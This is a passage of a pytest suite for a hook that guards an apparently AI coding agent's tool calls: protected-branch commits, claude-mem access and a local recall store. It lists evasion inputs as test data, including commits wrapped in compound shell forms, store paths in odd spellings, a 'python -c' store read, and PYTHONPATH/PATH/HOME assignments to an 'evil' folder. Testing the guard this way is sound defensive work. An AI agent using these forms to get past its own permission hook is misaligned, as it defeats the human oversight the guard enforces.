    # and the multi-commit reason for copying is stated, not just the rule
    assert re.search(r"more than once|second commit", block)


def test_execute_md_step5_fresh_marker_also_embeds_baseline() -> None:
    block = _md_step5()
    assert "re-commit" in block, "step-5 slice must be the re-verify/re-commit block"
    assert "fresh `.tests-ran-<story_id>` marker" in block
    assert _BASELINE_LINE_RE.search(block), (
        "step 5's fresh marker must carry the same copied-not-recomputed "
        "`baseline=<sha>` line as step 2's"
    )


def test_mutant_step5_marker_without_baseline_reds_only_step5() -> None:
    """Twin: strip the baseline rule from step 5 only.

    The step-5 matcher must red while the IDENTICAL matcher stays green on step
    2. The green control is the load-bearing half: a matcher that scanned the
    whole file would be satisfied by step 2's sentence and would pass the step-5
    check vacuously.
    """
    text = _execute_text()
    original = _md_step5(text)
    mutated_block = _STEP5_BASELINE_SENTENCE_RE.sub("", original, count=1)
    assert mutated_block != original, "step-5 baseline sentence anchor drifted"
    mutated = text.replace(original, mutated_block, 1)

    assert not _BASELINE_LINE_RE.search(_md_step5(mutated)), (
        "with the sentence stripped, the step-5 assertion must fail"
    )
    assert _BASELINE_LINE_RE.search(_md_step2(mutated)), (
        "the step-2 control must stay green under the same mutation"
    )


def test_mutant_step2_marker_without_baseline_reds_only_step2() -> None:
    """Twin, mirrored: strip the baseline rule from step 2 only.

    Same paired shape, so neither site can satisfy its own check off the other's
    copy of the rule.
    """
    text = _execute_text()
    original = _md_step2(text)
    mutated_block = _STEP2_BASELINE_SENTENCE_RE.sub("", original, count=1)
    assert mutated_block != original, "step-2 baseline sentence anchor drifted"
    mutated = text.replace(original, mutated_block, 1)

    assert not _BASELINE_LINE_RE.search(_md_step2(mutated)), (
        "with the sentence stripped, the step-2 assertion must fail"
    )
    assert _BASELINE_LINE_RE.search(_md_step5(mutated)), (
        "the step-5 control must stay green under the same mutation"
    )


# ---------------------------------------------------------------------------
# Compound commands and the `&` separator.
#
# `_token_write_verbs` reads the segment's LEADING token. A shell keyword or a
# group opener occupies that position inside every compound form, and a lone
# `&` was in neither separator set -- so `if true; then <verb>; fi` and
# `build & <verb>` both classified as "no git write" and skipped the
# protected-branch, tests-ran, freshness AND empty-index gates at once.
# ---------------------------------------------------------------------------

_V = "git" + " " + "commit"

_COMPOUND_COMMIT_FORMS = (
    ("if_then", "if true; then %s -m wip; fi" % _V),
    ("for_do", "for i in 1; do %s -m wip; done" % _V),
    ("while_do", "while false; do %s -m wip; done" % _V),
    ("subshell", "( %s -m wip )" % _V),
    ("subshell_glued", "(%s -m wip)" % _V),
    ("brace_group", "{ %s -m wip; }" % _V),
    ("negated", "! %s -m wip" % _V),
    ("background_amp", "npm run build & %s -m wip" % _V),
)


@pytest.mark.parametrize(
    "name,command",
    _COMPOUND_COMMIT_FORMS,
    ids=[n for n, _ in _COMPOUND_COMMIT_FORMS],
)
def test_compound_forms_still_reach_the_commit_gate(
    tmp_path: Path, name: str, command: str
) -> None:
    """Every compound wrapping of a real commit is still classified as a write."""
    repo = tmp_path / ("repo_" + name)
    repo.mkdir()
    _init_repo(repo, "main")

    code, out = _run_hook(_commit_event(repo, command), repo)

    assert code == 2, "%s: compound form was waved through" % name
    assert "Protected-branch" in _reason(out)


_BENIGN_COMPOUND_FORMS = (
    ("if_then", "if true; then echo hi; fi"),
    ("for_do", "for i in 1 2; do echo $i; done"),
    ("subshell", "( echo hi )"),
    ("brace_group", "{ echo hi; }"),
    ("background_amp", "npm run watch & echo started"),
)


@pytest.mark.parametrize(
    "name,command",
    _BENIGN_COMPOUND_FORMS,
    ids=[n for n, _ in _BENIGN_COMPOUND_FORMS],
)
def test_compound_forms_without_a_git_write_stay_allowed(
    tmp_path: Path, name: str, command: str
) -> None:
    """Control. Stripping keywords must not turn every compound into a deny --
    without this pair, the deny test above would also pass on a guard that
    denied everything."""
    repo = tmp_path / ("ctl_" + name)
    repo.mkdir()
    _init_repo(repo, "main")

    code, out = _run_hook(_commit_event(repo, command), repo)

    assert code == 0, "%s: benign compound was denied" % name
    assert out is None


def test_quoted_ampersand_in_a_git_value_option_still_denies(tmp_path: Path) -> None:
    """The regression an `&` bolted onto the EXISTING separator sets would cause.

    Splitting on `&` is quote-blind, so `git -c alias.x='a&b' <verb>` tears into
    two fragments that BOTH fail to tokenize and BOTH miss the fallback regex
    (the first carries no verb, the second carries no `git`). Adding `&` as a
    THIRD unioned set keeps the un-split classification that already caught it.
    """
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "main")

    command = "git -c alias.x='a&b' " + _V.split()[1] + " -m wip"
    code, out = _run_hook(_commit_event(repo, command), repo)

    assert code == 2
    assert "Protected-branch" in _reason(out)


_LEADING_NOISE_CALL = "    tokens = _strip_leading_noise(tokens)"
_AMP_SEPARATOR_LINE = '        r"&&|\\|\\||;|\\||&|\\n|\\r",\n'


def test_mutant_without_keyword_stripping_allows_a_compound_write(
    tmp_path: Path,
) -> None:
    """Twin: revert the leading-noise strip and the compound form is ALLOWED.

    The ALLOW is the point. If the deny survived this mutation, the strip would
    not be what produces it and the tests above would pin nothing.
    """
    mutant = _write_mutant(
        tmp_path,
        "no_keyword_strip",
        _LEADING_NOISE_CALL,
        "    tokens = _strip_assignments(tokens)",
    )
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "main")

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo, "if true; then %s -m wip; fi" % _V), repo
    )

    assert code == 0
    assert out is None


def test_mutant_without_the_amp_separator_allows_a_background_write(
    tmp_path: Path,
) -> None:
    """Twin for the `&` set: drop it and `build & <verb>` is ALLOWED again."""
    mutant = _write_mutant(tmp_path, "no_amp_separator", _AMP_SEPARATOR_LINE, "")
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "main")

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo, "npm run build & %s -m wip" % _V), repo
    )

    assert code == 0
    assert out is None


# ---------------------------------------------------------------------------
# Cross-Session Recall on the local run store (latch v2).
#
# latch-and-guard.md, Guard items 1 to 5, through the CSR-UNIT and CSR-INT rows
# of test-design-epic-cross-session-recall-local-store.md marked PR 2 (each
# test names its row). Every case runs the real hook as a subprocess under a
# present latch whose `store` sits under tmp_path, with HOME and USERPROFILE
# pointed at tmp and ULTRACODE_IMPL_ARTIFACTS at the latch's folder; only the
# parity and separator rows read the hook in-process. On Windows every Bash
# string is built with as_posix() or quoting: POSIX shlex drops unquoted
# backslashes.
#
# Maintainer defaults pinned here, recorded as such:
#   - C-2: a latch with no usable store (unset, a v1 latch, an unreadable
#     latch) still denies every claude-mem call and skips the store-path rule.
#   - Liveness (decision 2): a present latch counts as live, and every deny it
#     causes names the latch path and says to delete it when no run is active.
# Choices this change makes on the test design's open points, to confirm:
#   - C-7: `python`, `python3` and `python3.N` may lead an exempt segment, `py`
#     may not. C-8: the script must follow `uv run` or python directly.
#   - C-11: the skill root is the guard's own location (scripts/hooks/../..).
# ---------------------------------------------------------------------------

SCRIPTS = HOOK.parents[1]
_PINNED_RECALL = SCRIPTS / "mem_recall.py"
_PINNED_OBSERVATION = SCRIPTS / "mem_observation.py"
_MEM_COMMON = SCRIPTS / "lib" / "mem_common.py"
_REPO_ROOT = HOOK.parents[4]
_RUN = "epic-7-20260604T172512Z"
_DEAD_RUN = "epic-3-20260101T000000Z"
_WINDOWS_ONLY = pytest.mark.skipif(sys.platform != "win32", reason="Windows path folding")
_NEEDS_GIT = pytest.mark.skipif(not shutil.which("git"), reason="git not on PATH")


def _v2_latch(store: object, **overrides) -> dict:
    """A v2 latch as mem_recall.py latch writes it (green unless overridden)."""
    state = {
        "latch_version": 2,
        "run_id": _RUN,
        "backend": "jsonl",
        "store_ok": True,
        "recall": "on",
        "store": None if store is None else str(store),
        "fingerprint": "0123456789abcdef",
        "created_at": "2026-06-04T17:25:12Z",
    }
    state.update(overrides)
    return state


class _StoreWorld(NamedTuple):
    home: Path
    store: Path
    cwd: Path
    impl: Path
    tmp: Path

    @property
    def latch(self) -> Path:
        return self.impl / ".mem-state.json"

    @property
    def s(self) -> str:
        """The store as a Bash command spells it."""
        return self.store.as_posix()

    @property
    def env(self) -> dict:
        return {
            "HOME": str(self.home),
            "USERPROFILE": str(self.home),
            "ULTRACODE_IMPL_ARTIFACTS": str(self.impl),
        }


@pytest.fixture
def store_world(tmp_path: Path) -> _StoreWorld:
    """A green v2 latch whose store is ~/.ultracode-goal/recall under a tmp home."""
    home = tmp_path / "home"
    store = home / ".ultracode-goal" / "recall"
    cwd = tmp_path / "repo"
    impl = tmp_path / "impl"
    store.mkdir(parents=True)
    cwd.mkdir()
    _write_state(impl, _v2_latch(store))
    return _StoreWorld(home, store, cwd, impl, tmp_path)


def _run_in(
    world: _StoreWorld,
    tool_name: str,
    tool_input: dict,
    *,
    cwd: Path | None = None,
    hook: Path = HOOK,
) -> tuple[int, dict | None]:
    where = cwd or world.cwd
    return _run_mutant_hook(hook, _mem_event(tool_name, where, tool_input), where, world.env)


def _bash(world: _StoreWorld, command: str, **kwargs) -> tuple[int, dict | None]:
    return _run_in(world, "Bash", {"command": command}, **kwargs)


def _assert_latch_denied(code: int, out: dict | None, latch: Path) -> str:
    """A deny the latch causes: it names the latch and says how to clear it (AC-13)."""
    assert code == 2, out
    assert out is not None
    decision = out["hookSpecificOutput"]
    assert decision["permissionDecision"] == "deny"
    reason = decision["permissionDecisionReason"]
    assert reason.startswith("Cross-Session Recall guard: ")
    assert f"The run latch {latch} is present" in reason
    assert "If no run is active" in reason
    assert f"delete {latch} and retry." in reason
    return reason


def _assert_allowed(code: int, out: dict | None) -> None:
    assert code == 0, out
    assert out is None, out


def _filter_args(world: _StoreWorld) -> str:
    return f"filter --impl-artifacts {world.impl.as_posix()} --store {world.s}"


def _write_args(world: _StoreWorld) -> str:
    return (
        f"write --impl-artifacts {world.impl.as_posix()} --store {world.s} "
        f"--epic 7 --run-id {_RUN} --gate-status PASS --verdict advance"
    )


def _exempt_filter(world: _StoreWorld) -> str:
    return f"uv run {_PINNED_RECALL.as_posix()} {_filter_args(world)}"


# --- Guard item 1: claude-mem, denied under every present latch --------------

_PRESENT_LATCHES = {
    "v1-green-by-old-rules": lambda store: _GREEN_STATE,
    "v1-red": lambda store: {**_GREEN_STATE, "schema_ok": False},
    "v2-store-ok": lambda store: _v2_latch(store),
    "v2-store-not-ok": lambda store: _v2_latch(store, store_ok=False),
    "v2-recall-off": lambda store: _v2_latch(store, recall="off", store_ok=False),
    "zero-byte": lambda store: "",
    "malformed-json": lambda store: "{not: valid json,,,",
    "non-object": lambda store: [1, 2],
    "latch-version-3": lambda store: _v2_latch(store, latch_version=3),
}


@pytest.mark.parametrize("tool_name", _MEM_PLUGIN_TOOLS + _MEM_BARE_TOOLS)
@pytest.mark.parametrize("latch", sorted(_PRESENT_LATCHES))
def test_csr_claude_mem_call_denied_under_every_present_latch(
    store_world: _StoreWorld, latch: str, tool_name: str
) -> None:
    """CSR-UNIT-004 (AC-11, AC-13): every name form, every present latch, no green path."""
    _write_state(store_world.impl, _PRESENT_LATCHES[latch](store_world.store))

    code, out = _run_in(store_world, tool_name, {"query": "x"})

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"refusing the claude-mem MCP call {tool_name}." in reason


_INPUT_KEYS = (
    ("Read", "file_path"),
    ("Write", "file_path"),
    ("Edit", "file_path"),
    ("MultiEdit", "file_path"),
    ("NotebookEdit", "notebook_path"),
    ("Glob", "path"),
    ("Glob", "pattern"),
    ("Grep", "path"),
    ("Grep", "glob"),
)
_INPUT_KEY_IDS = [f"{tool}-{key}" for tool, key in _INPUT_KEYS]


def _file_input(tool: str, key: str, value: str) -> dict:
    """A realistic input for one file tool, with `value` under `key`."""
    base = {
        "Read": {},
        "Write": {"content": "x"},
        "Edit": {"old_string": "a", "new_string": "b"},
        "MultiEdit": {"edits": [{"old_string": "a", "new_string": "b"}]},
        "NotebookEdit": {"new_source": "x"},
        "Glob": {"pattern": "*.json"},
        "Grep": {"pattern": "secret"},
    }[tool]
    return {**base, key: value}


@pytest.mark.parametrize("tool,key", _INPUT_KEYS, ids=_INPUT_KEY_IDS)
def test_csr_claude_mem_reach_denied_through_every_input_key(
    store_world: _StoreWorld, tool: str, key: str
) -> None:
    """CSR-UNIT-005 (AC-11): a reach into .claude-mem under a green v2 latch."""
    value = (store_world.home / ".claude-mem" / "claude-mem.db").as_posix()

    code, out = _run_in(store_world, tool, _file_input(tool, key, value))

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"refusing a {tool} call whose {key} reaches into '.claude-mem'" in reason


def test_csr_claude_mem_reach_denied_through_bash(store_world: _StoreWorld) -> None:
    """CSR-UNIT-005 (AC-11): the Bash half."""
    code, out = _bash(store_world, "sqlite3 ~/.claude-mem/claude-mem.db .tables")
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize("tool_name", _MEM_PLUGIN_TOOLS + _MEM_BARE_TOOLS)
def test_csr_no_latch_leaves_claude_mem_alone(tmp_path: Path, tool_name: str) -> None:
    """CSR-UNIT-006 (AC-11): outside a run the user's own claude-mem is untouched.

    The matcher and look-alike rows the spec keeps are unchanged above:
    test_risk_matcher_hits_live_claude_mem_names and
    test_risk_matcher_ignores_lookalike_names.
    """
    impl = tmp_path / "impl"  # no latch written
    code, out = _run_hook(
        _mem_event(tool_name, tmp_path, {"query": "x"}),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_allowed(code, out)


@pytest.mark.parametrize("tool_name", _NON_MEM_TOOLS)
def test_csr_lookalike_names_pass_a_v2_latch(store_world: _StoreWorld, tool_name: str) -> None:
    """CSR-UNIT-006: the look-alikes stay allowed under a v2 latch with a store too."""
    code, out = _run_in(store_world, tool_name, {"query": "x"})
    _assert_allowed(code, out)


def test_csr_deny_reason_names_the_latch_and_the_delete_advice(store_world: _StoreWorld) -> None:
    """AC-13 wording, pinned whole on one deny (decision 2)."""
    code, out = _run_in(store_world, "mcp__claude-mem__search", {})

    assert code == 2
    latch = store_world.latch
    assert _reason(out) == (
        "Cross-Session Recall guard: refusing the claude-mem MCP call "
        "mcp__claude-mem__search. UltraCode-Goal no longer uses claude-mem, so "
        "while a run latch is present every claude-mem call is denied. The run "
        f"latch {latch} is present, and a present latch counts as a live "
        "UltraCode-Goal run, whatever its version or colour. If no run is "
        "active, that latch was left behind by a run that ended without "
        f"removing it: delete {latch} and retry."
    )


def test_csr_left_behind_latch_keeps_denying_until_deleted(store_world: _StoreWorld) -> None:
    """CSR-UNIT-027 (AC-13): another run's latch, left by a run that died.

    The guard reads no clock and no run id, so the latch denies claude-mem and
    the store path, each reason naming the latch and the delete advice, until
    the file is gone; then the same calls are allowed.
    """
    _write_state(
        store_world.impl,
        _v2_latch(store_world.store, run_id=_DEAD_RUN, created_at="2026-01-01T00:00:00Z"),
    )
    run_file = f"{store_world.s}/local-0123456789abcdef/runs/{_DEAD_RUN}.jsonl"
    calls = (
        ("mcp__plugin_claude-mem_mcp-search__search", {"query": "x"}),
        ("Read", {"file_path": run_file}),
        ("Bash", {"command": f"cat {run_file}"}),
    )
    for tool, tool_input in calls:
        code, out = _run_in(store_world, tool, tool_input)
        _assert_latch_denied(code, out, store_world.latch)

    store_world.latch.unlink()

    for tool, tool_input in calls:
        code, out = _run_in(store_world, tool, tool_input)
        _assert_allowed(code, out)


def test_csr_anything_at_the_latch_path_counts_as_present(store_world: _StoreWorld) -> None:
    """Fail closed: a latch path that holds a folder is a latch that cannot be
    read, so claude-mem is denied; with no store to read, nothing is denied by
    path."""
    store_world.latch.unlink()
    store_world.latch.mkdir()

    code, out = _run_in(store_world, "mcp__claude-mem__search", {})
    _assert_latch_denied(code, out, store_world.latch)
    _assert_allowed(*_run_in(store_world, "Read", {"file_path": f"{store_world.s}/x"}))


# --- Guard item 2: the store-path rule ----------------------------------------


def _store_spellings(world: _StoreWorld) -> dict[str, str]:
    return {
        "absolute": world.s,
        "tilde": "~/.ultracode-goal/recall",
        "dollar-home": "$HOME/.ultracode-goal/recall",
        "braced-home": "${HOME}/.ultracode-goal/recall",
        "percent-userprofile": "%USERPROFILE%/.ultracode-goal/recall",
        "relative-to-cwd": Path(os.path.relpath(world.store, world.cwd)).as_posix(),
    }


_SPELLINGS = (
    "absolute",
    "tilde",
    "dollar-home",
    "braced-home",
    "percent-userprofile",
    "relative-to-cwd",
)


@pytest.mark.parametrize("channel", ["read", "bash-unquoted", "bash-double-quoted"])
@pytest.mark.parametrize("spelling", _SPELLINGS)
def test_csr_store_spelling_denied(store_world: _StoreWorld, spelling: str, channel: str) -> None:
    """CSR-UNIT-007 (AC-12, AC-23): one deny per accepted spelling and channel."""
    path = f"{_store_spellings(store_world)[spelling]}/runs/x.jsonl"
    if channel == "read":
        code, out = _run_in(store_world, "Read", {"file_path": path})
    elif channel == "bash-unquoted":
        code, out = _bash(store_world, f"cat {path}")
    else:
        code, out = _bash(store_world, f'cat "{path}"')

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"names the recall store {store_world.store}." in reason
    assert str(_PINNED_RECALL) in reason and str(_PINNED_OBSERVATION) in reason


@pytest.mark.parametrize(
    "form",
    ["tool --opt={s}/runs/x.jsonl", "FOO={s} cmd", "cat <{s}/runs/x.jsonl"],
    ids=["glued-option", "glued-assignment", "glued-input-redirection"],
)
def test_csr_store_glued_into_a_word_denied(store_world: _StoreWorld, form: str) -> None:
    """CSR-UNIT-007: the glued forms a whole-token comparison would miss."""
    code, out = _bash(store_world, form.format(s=store_world.s))
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize("suffix", ["", "/", "//", "/."], ids=["bare", "slash", "two-slashes", "slash-dot"])
def test_csr_store_root_with_trailing_separators_denied(store_world: _StoreWorld, suffix: str) -> None:
    """CSR-UNIT-007: the store folder itself, with and without trailing separators."""
    root = store_world.s + suffix
    for tool, tool_input in (
        ("Glob", {"pattern": "*", "path": root}),
        ("Read", {"file_path": root}),
        ("Bash", {"command": f"ls {root}"}),
    ):
        code, out = _run_in(store_world, tool, tool_input)
        _assert_latch_denied(code, out, store_world.latch)


def test_csr_store_siblings_and_ancestors_are_allowed(store_world: _StoreWorld) -> None:
    """Control: a name that merely starts like the store, or a folder above it
    (the accepted ancestor-search residual), is not the store."""
    sibling = f"{store_world.s}2/runs/x.jsonl"
    parent = store_world.store.parent.as_posix()
    for tool, tool_input in (
        ("Read", {"file_path": sibling}),
        ("Bash", {"command": f"cat {sibling}"}),
        ("Glob", {"pattern": "**/*.jsonl", "path": parent}),
        ("Bash", {"command": f"ls {parent}"}),
        ("Bash", {"command": "echo 'feat(recall): keep the store out'"}),
    ):
        code, out = _run_in(store_world, tool, tool_input)
        _assert_allowed(code, out)


@_WINDOWS_ONLY
@pytest.mark.parametrize("quoting", ["unquoted", "double-quoted"])
def test_csr_userprofile_backslash_spelling_denied_on_windows(
    store_world: _StoreWorld, quoting: str
) -> None:
    """CSR-UNIT-007, Windows only: %USERPROFILE%\\... with backslashes.

    On POSIX `\\` is not a separator, so this spelling names no store there.
    Unquoted, shlex drops the backslashes and the raw text still reads it.
    """
    path = "%USERPROFILE%\\.ultracode-goal\\recall\\runs\\x.jsonl"
    code, out = _run_in(store_world, "Read", {"file_path": path})
    _assert_latch_denied(code, out, store_world.latch)
    command = f"cat {path}" if quoting == "unquoted" else f'cat "{path}"'
    code, out = _bash(store_world, command)
    _assert_latch_denied(code, out, store_world.latch)


@_WINDOWS_ONLY
@pytest.mark.parametrize(
    "variant",
    ["forward-slashes", "upper-case", "upper-case-forward-slashes", "lower-case"],
)
def test_csr_windows_separator_and_case_folding(store_world: _StoreWorld, variant: str) -> None:
    """CSR-UNIT-008 (AC-12, AC-23), Windows only: a path that differs from the
    store only in separator or letter case is the store."""
    native = str(store_world.store)
    spelled = {
        "forward-slashes": store_world.store.as_posix(),
        "upper-case": native.upper(),
        "upper-case-forward-slashes": store_world.store.as_posix().upper(),
        "lower-case": native.lower(),
    }[variant]
    path = spelled + "\\runs\\x.jsonl"
    code, out = _run_in(store_world, "Read", {"file_path": path})
    _assert_latch_denied(code, out, store_world.latch)
    code, out = _bash(store_world, f'cat "{path}"')
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize("tool,key", _INPUT_KEYS, ids=_INPUT_KEY_IDS)
def test_csr_store_named_in_each_input_key_denied(
    store_world: _StoreWorld, tool: str, key: str
) -> None:
    """CSR-UNIT-009 (AC-12, AC-23): one deny per inspected input key."""
    if key in ("pattern", "glob"):
        value = f"{store_world.s}/**/*.jsonl"
    else:
        value = f"{store_world.s}/runs/x.jsonl"

    code, out = _run_in(store_world, tool, _file_input(tool, key, value))

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"refusing a {tool} call whose {key} names the recall store" in reason


@pytest.mark.parametrize(
    "tool,key",
    [("Glob", "pattern"), ("Grep", "glob")],
    ids=["Glob-pattern", "Grep-glob"],
)
def test_csr_relative_pattern_is_taken_from_the_tool_path(
    store_world: _StoreWorld, tool: str, key: str
) -> None:
    """CSR-UNIT-009: a relative pattern under the tool's own `path` reaches the
    store although `path` (an ancestor) does not."""
    tool_input = _file_input(tool, key, "recall/**/*.jsonl")
    tool_input["path"] = store_world.store.parent.as_posix()

    code, out = _run_in(store_world, tool, tool_input)

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"whose {key} names the recall store" in reason


@pytest.mark.parametrize("tool,key", _INPUT_KEYS, ids=_INPUT_KEY_IDS)
def test_csr_unrelated_paths_pass_every_file_tool(
    store_world: _StoreWorld, tool: str, key: str
) -> None:
    """CSR-UNIT-009 control: the same tool and key on a path outside the store."""
    value = (store_world.cwd / "src" / "x.py").as_posix()
    code, out = _run_in(store_world, tool, _file_input(tool, key, value))
    _assert_allowed(code, out)


@pytest.mark.parametrize(
    "joiner",
    [" ; ", "\n", " & "],
    ids=["chain", "newline", "background-amp"],
)
def test_csr_store_segment_denied_under_each_separator_set(
    store_world: _StoreWorld, joiner: str
) -> None:
    """CSR-UNIT-010 (AC-12, AC-23): an exempt lead never covers a store-touching
    tail, whichever separator set exposes it."""
    command = f"{_exempt_filter(store_world)}{joiner}cat {store_world.s}/runs/x.jsonl"

    code, out = _bash(store_world, command)

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert "segment 'cat " in reason


def test_csr_each_separator_set_is_load_bearing(guard_module, tmp_path: Path, monkeypatch) -> None:
    """CSR-UNIT-010 twin: drop the sets that expose a tail and it hides behind
    the exempt lead, so each set is what denies its own case."""
    store = tmp_path / "home" / ".ultracode-goal" / "recall"
    root = (os.path.normcase(os.path.abspath(store)),)
    cwd = str(tmp_path)
    homes = [str(tmp_path / "home")]
    lead = f"uv run {_PINNED_RECALL.as_posix()} filter --store {store.as_posix()}"
    tail = f"cat {store.as_posix()}/runs/x.jsonl"
    shipped = guard_module._STORE_SEPARATOR_SETS
    for command, without_its_sets in (
        (f"{lead} ; {tail}", (r"(?!)",)),  # no split at all
        (f"{lead}\n{tail}", shipped[:1]),  # no newline set
        (f"{lead} & {tail}", shipped[:2]),  # no lone-& set
    ):
        assert guard_module._store_segment(command, root, cwd, homes) is not None, command
        monkeypatch.setattr(guard_module, "_STORE_SEPARATOR_SETS", without_its_sets)
        assert guard_module._store_segment(command, root, cwd, homes) is None, command
        monkeypatch.setattr(guard_module, "_STORE_SEPARATOR_SETS", shipped)


def _git_classifier_separator_sets() -> tuple[str, ...]:
    """The tuple of patterns the `for separators in (...)` loop of
    _command_write_verbs iterates, read from the hook's syntax tree."""
    tree = ast.parse(_hook_source())
    func = next(
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.FunctionDef) and node.name == "_command_write_verbs"
    )
    loops = [
        node
        for node in ast.walk(func)
        if isinstance(node, ast.For)
        and isinstance(node.target, ast.Name)
        and node.target.id == "separators"
    ]
    assert len(loops) == 1, "the git classifier's separator loop moved"
    assert isinstance(loops[0].iter, ast.Tuple)
    return tuple(ast.literal_eval(element) for element in loops[0].iter.elts)


def test_csr_store_separator_sets_mirror_the_git_classifier(guard_module) -> None:
    """The store rule splits under "each of the guard's three separator sets":
    exactly the patterns _command_write_verbs splits under, in order, so a set
    added to or dropped from either side reds here."""
    assert guard_module._STORE_SEPARATOR_SETS == _git_classifier_separator_sets()
    assert len(guard_module._STORE_SEPARATOR_SETS) == 3


# --- Guard item 3: the pinned script exemption ------------------------------


def _allowed_calls(world: _StoreWorld) -> dict[str, str]:
    recall = _PINNED_RECALL.as_posix()
    observation = _PINNED_OBSERVATION.as_posix()
    impl = world.impl.as_posix()
    filt = _filter_args(world)
    return {
        "uv-run-write": f"uv run {observation} {_write_args(world)}",
        "uv-run-filter": f"uv run {recall} {filt}",
        "uv-run-latch": (
            f"uv run {recall} latch --impl-artifacts {impl} --run-id {_RUN} "
            f"--recall on --store {world.s}"
        ),
        "uv-run-drain": f"uv run {observation} drain --impl-artifacts {impl} --store {world.s}",
        "python-write": f"python {observation} {_write_args(world)}",
        "python3-filter": f"python3 {recall} {filt}",
        "python3-minor-filter": f"python3.11 {recall} {filt}",
        "leading-assignment": f"FOO=1 uv run {recall} {filt}",
        "keyword": f"if true; then uv run {recall} {filt}; fi",
        "paren-group": f"( uv run {recall} {filt} )",
        "glued-paren": f"(uv run {recall} {filt})",
        "brace-group": f"{{ uv run {recall} {filt}; }}",
        "dot-step": f"uv run {SCRIPTS.as_posix()}/./mem_recall.py {filt}",
        "tilde-store": f"uv run {recall} filter --impl-artifacts {impl} --store ~/.ultracode-goal/recall",
        "quoted": f'uv run "{recall}" filter --impl-artifacts "{impl}" --store "{world.s}"',
        "then-unrelated": f"uv run {recall} {filt} && echo done",
    }


_ALLOWED_CALLS = (
    "uv-run-write",
    "uv-run-filter",
    "uv-run-latch",
    "uv-run-drain",
    "python-write",
    "python3-filter",
    "python3-minor-filter",
    "leading-assignment",
    "keyword",
    "paren-group",
    "glued-paren",
    "brace-group",
    "dot-step",
    "tilde-store",
    "quoted",
    "then-unrelated",
)


@pytest.mark.parametrize("name", _ALLOWED_CALLS)
def test_csr_pinned_recall_scripts_are_exempt(store_world: _StoreWorld, name: str) -> None:
    """CSR-UNIT-011 (AC-12): the positive controls. An exemption that fails
    closed turns recall off in every run."""
    code, out = _bash(store_world, _allowed_calls(store_world)[name])
    _assert_allowed(code, out)


@pytest.mark.parametrize(
    "cwd_name,operand",
    [("scripts", "./mem_recall.py"), ("skill-root", "scripts/mem_recall.py")],
    ids=["dot-slash-from-scripts", "relative-from-skill-root"],
)
def test_csr_relative_pinned_path_is_exempt_from_its_own_folder(
    store_world: _StoreWorld, cwd_name: str, operand: str
) -> None:
    """CSR-UNIT-011: a relative path counts when it resolves, from the event's
    cwd, to the pinned script."""
    cwd = SCRIPTS if cwd_name == "scripts" else SCRIPTS.parent
    code, out = _bash(store_world, f"uv run {operand} {_filter_args(store_world)}", cwd=cwd)
    _assert_allowed(code, out)


@pytest.mark.parametrize("joiner", ["&&", "||", ";", "|", "\n", "&"])
def test_csr_compound_with_a_store_segment_denied(store_world: _StoreWorld, joiner: str) -> None:
    """CSR-UNIT-012 (AC-12, AC-23): checked per segment, not on the whole command."""
    command = f"{_exempt_filter(store_world)} {joiner} cat {store_world.s}/runs/x.jsonl"
    code, out = _bash(store_world, command)
    _assert_latch_denied(code, out, store_world.latch)


def _not_exempt_calls(world: _StoreWorld) -> dict[str, str]:
    recall = _PINNED_RECALL.as_posix()
    elsewhere = world.tmp / "x" / "scripts" / "mem_observation.py"
    elsewhere.parent.mkdir(parents=True, exist_ok=True)
    shutil.copyfile(_PINNED_OBSERVATION, elsewhere)
    (world.cwd / "mem_recall.py").write_text("print('not the pinned script')\n", encoding="utf-8")
    payload = f"open('{world.s}/runs/x.jsonl').read()"
    evil = (world.tmp / "evil").as_posix()
    return {
        # CSR-UNIT-013: the path is pinned, not the basename.
        "same-name-elsewhere": f"uv run {elsewhere.as_posix()} write --store {world.s}",
        "dot-slash-from-another-cwd": f"uv run ./mem_recall.py filter --store {world.s}",
        "dotdot-escape": (
            f"uv run {SCRIPTS.as_posix()}/../../evil/scripts/mem_observation.py "
            f"write --store {world.s}"
        ),
        "python-dash-c": f'python -c "{payload}" {recall} filter',
        "uv-run-python-dash-c": f'uv run python -c "{payload}" {recall} filter',
        # C-7 and C-8 as chosen here: the script right after `uv run` or a bare python.
        "option-before-script": f"uv run --with x {recall} filter --store {world.s}",
        "uv-run-python": f"uv run python {recall} filter --store {world.s}",
        "interpreter-by-path": f"/usr/bin/python3 {recall} filter --store {world.s}",
        "py-launcher": f"py {recall} filter --store {world.s}",
        # An assignment that swaps the interpreter or its modules.
        "pythonpath-assignment": f"PYTHONPATH={evil} uv run {recall} filter --store {world.s}",
        "path-assignment": f"PATH={evil}:$PATH python {recall} filter --store {world.s}",
        "uv-assignment": f"UV_PYTHON={evil}/python uv run {recall} filter --store {world.s}",
        # The same, glued to a group opener (bmad review 6).
        "glued-paren-assignment": f"(PYTHONPATH={evil} uv run {recall} filter --store {world.s})",
        # An assignment that moves the home folder, the configuration uv, git
        # or Python read, or the environment the call runs in (bypass review 1).
        "home-assignment": f"HOME={evil} python3 {recall} filter --store {world.s}",
        "userprofile-assignment": f"USERPROFILE={evil} uv run {recall} filter --store {world.s}",
        "appdata-assignment": f"APPDATA={evil} uv run {recall} filter --store {world.s}",
        "xdg-assignment": f"XDG_CONFIG_HOME={evil} uv run {recall} filter --store {world.s}",
        "git-config-assignment": f"GIT_CONFIG_COUNT=1 uv run {recall} filter --store {world.s}",
        "conda-assignment": f"CONDA_PREFIX={evil} uv run {recall} filter --store {world.s}",
        "virtual-env-assignment": f"VIRTUAL_ENV={evil} uv run {recall} filter --store {world.s}",
